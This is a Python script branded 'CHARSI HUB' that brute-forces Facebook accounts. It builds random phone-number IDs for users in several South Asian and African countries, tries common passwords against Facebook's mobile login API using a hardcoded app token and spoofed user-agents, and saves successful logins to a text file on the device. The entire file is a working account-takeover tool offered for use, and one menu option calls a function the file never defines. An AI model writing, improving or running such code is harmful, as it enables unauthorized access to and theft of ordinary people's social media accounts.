# Script: CHARSI HUB INTERNATIONAL (FINAL FIXED)
# Author: CHARSI-HUB (ERROR X ETHAN)
import os, requests, json, time, re, random, sys, uuid, platform
from concurrent.futures import ThreadPoolExecutor as tred

# --- Colors ---
G = "\033[1;32m" # Green
R = "\033[1;31m" # Red
W = "\033[1;97m" # White
loop = 0
oks = []
cps = []

# --- Banner ---
def clear():
    os.system('clear')
    print(f"""{G}
  ____ _   _    _    ____  ____ ___ 
 / ___| | | |  / \  |  _ \/ ___|_ _|
| |   | |_| | / _ \ | |_) \___ \ | | 
| |___|  _  |/ ___ \|  _ < ___) || | 
 \____|_| |_/_/   \_\_| \_\____/___|
{R}--------------------------------------------------
{W} [•] AUTHOR    : {G}CHARSI HUB (NO ERROR)
{W} [•] METHODS   : {G}M1 - M2 - M3 (FORCE CLONE)
{W} [•] TARGET    : {G}PK, BD, NG, ID, NP, IN
{R}--------------------------------------------------""")

# --- Super Strong User-Agent (Updated Dec 2024) ---
def generate_ua():
    # Modern Android & iPhone Mix for Bypass
    fbv = f"{random.randint(440, 490)}.0.0.{random.randint(10, 99)}.{random.randint(100, 200)}"
    fbb = str(random.randint(500000000, 600000000))
    android_ver = random.choice(['10','11','12','13','14'])
    ua = f'Mozilla/5.0 (Linux; Android {android_ver}; SM-G998B Build/TP1A.{random.randint(111111,999999)}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(110,128)}.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fbv};FBBV/{fbb};]'
    return ua

# --- Main Menu ---
def Menu():
    clear()
    print(f' {W}[1] FILE CLONING (BRUTE FORCE)')
    print(f' {W}[2] RANDOM CLONING (ALL COUNTRIES)')
    print(f' {W}[0] EXIT')
    print(f'{R}--------------------------------------------------')
    opt = input(f' {G}SELECT : {W}')
    if opt == '1': File_Clone()
    elif opt == '2': Random_Clone()
    else: exit()

def Random_Clone():
    clear()
    print(f' {W}[1] PAKISTAN  [2] BANGLADESH')
    print(f' {W}[3] NIGERIA   [4] INDONESIA')
    print(f' {W}[5] NEPAL     [6] INDIA')
    print(f'{R}--------------------------------------------------')
    c_opt = input(f' {G}CHOOSE COUNTRY : {W}')
    code = input(f' {G}ENTER CODE : {W}')
    limit = int(input(f' {G}LIMIT : {W}'))
    
    with tred(max_workers=35) as hub:
        for _ in range(limit):
            ids = code + str(random.randint(1111111, 9999999))
            # 15 High Success Passwords
            pasx = [ids, ids[:7], ids[:6], '786786', 'khan123', 'khan786', 'pakistan', '57273200', 'khankhan', 'khan12345', 'google123', 'bangladesh', 'indonesia', 'nepal123', 'password']
            hub.submit(Brute_Force, ids, pasx)
    print(f'\n{R}--- DONE OK:{len(oks)} ---')

def Brute_Force(ids, pasx):
    global loop, oks, cps
    sys.stdout.write(f'\r\r{W} [CHARSI] %s | OK:%s | CP:%s '%(loop, len(oks), len(cps))); sys.stdout.flush()
    try:
        for pas in pasx:
            ua = generate_ua()
            # Method 3 Logic (Mix API)
            url = "https://b-graph.facebook.com/auth/login"
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": ids,
                "password": pas,
                "generate_session_cookies": "1",
                "method": "auth.login",
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            }
            headers = {
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "b-graph.facebook.com",
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "X-FB-Connection-Type": "WIFI",
                "X-FB-HTTP-Engine": "Liger"
            }
            res = requests.post(url, data=data, headers=headers).json()
            
            if "session_key" in res:
                print(f'\r{G} [CHARSI-OK] {ids} | {pas} {W}')
                os.system('espeak -a 300 "Charsi Ok ID"')
                oks.append(ids)
                open('/sdcard/CHARSI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                break
            elif "www.facebook.com" in str(res):
                cps.append(ids)
                break
        loop += 1
    except: pass

if __name__ == "__main__":
    Menu()
